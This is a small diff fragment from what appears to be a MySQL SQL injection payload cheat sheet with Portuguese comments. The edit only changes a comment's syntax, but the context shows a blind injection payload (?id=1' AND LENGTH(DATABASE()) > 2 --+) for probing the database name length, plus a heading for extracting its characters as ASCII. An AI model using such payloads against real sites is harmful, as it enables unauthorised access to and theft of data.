@@ -4,7 +4,7 @@
 
 #==============Payload MySQL==============
 
-#EXTRAINDO número de caracteres DA DATABASE.
+'''EXTRAINDO número de caracteres DA DATABASE.'''
   ?id=1' AND LENGTH(DATABASE()) > 2 --+
   
 #EXTRAINDO OS CARACTERES DO BANCO DE DADOS EM ASCII.
